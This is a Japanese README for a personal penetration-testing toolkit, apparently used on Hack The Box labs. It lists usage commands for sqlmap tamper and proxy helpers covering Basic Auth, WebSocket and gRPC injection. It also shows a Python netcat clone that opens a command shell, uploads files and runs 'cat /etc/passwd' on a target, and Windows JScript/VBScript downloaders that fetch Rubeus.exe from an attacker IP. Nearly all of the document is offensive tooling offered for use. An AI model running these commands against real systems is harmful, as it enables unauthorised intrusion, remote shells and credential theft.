# side_tool
個人的ハックツールに付与できる拡張機能コードリスト

## sqlmap_basic_auth.py
sqlmapコマンドのBasic Auth Base64 Request拡張機能コード
<br/>
コマンド例
```
sqlmap -r ./req --tamper=./sqlmap_basic_auth.py --ignore-code=401 --level 5 --risk 3
```
リクエスト例
```
#req
GET http://example.htb/ HTTP/1.1
Content-Length: 0

...
Authorization: Basic *
```
## sqlmap_websocket.py
websocketのプロトコルを介したsqlmapの実行。プロキシ`localhost:8081`を建て、そこからSQLi対象へwebsocket送ります。
<br/>
コマンド例
```
# websocketインストール
pip install websockets

# プロキシ起動
python3 sqlmap_websocket.py

# sqlmap実行
sqlmap -u "http://localhost:8081/?id=1" --batch --dbs
```

## http2grpc.go
gRPCのPort50051のPort向けにgrpcurlコマンドを使ってペイロードを送信するHTTPプロキシツール。
<br/>
```
# grpcurl インストール
$ go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# go mod整理
$ go mod init sqlmap/grpc
$ go mod tidy

# 起動
$ go run http2grpc.go

# sqlmap実行
sqlmap -u "http://localhost:8051/?id=1" --batch --dump
```
## netcat.py
Python環境が存在（ほぼある）するターゲットで簡易的に足場を構築するためのもの

```
# 対話型コマンドシェルの起動
netcat.py -t 10.11.14.13 -p 4444 -l -c
# ファイルのアップロード
netcat.py -t 10.11.14.13 -p 4444 -l -u=mytest.whatisup
# コマンドの実行
netcat.py -t 10.11.14.13 -p 4444 -l -e=\"cat /etc/passwd\"
# 通信先サーバーの135番ポートに文字列を送信
echo 'ABCDEFGHI' | ./netcat.py -t 10.11.14.13 -p 135
# サーバーに接続
netcat.py -t 10.11.14.13 -p 4444
```
## windows_wget_script
Windows標準で組み込まれているスクリプト言語を使ってWgetを実行する物

コマンド例：
```
#Javascript
cscript.exe /nologo wget.js hxxp://10.11.14.13/Rubeus.exe Rubeus.exe

#VBS
cscript.exe /nologo wget.vbs hxxp://10.11.14.13/Rubeus.exe Rubeus.exe
```
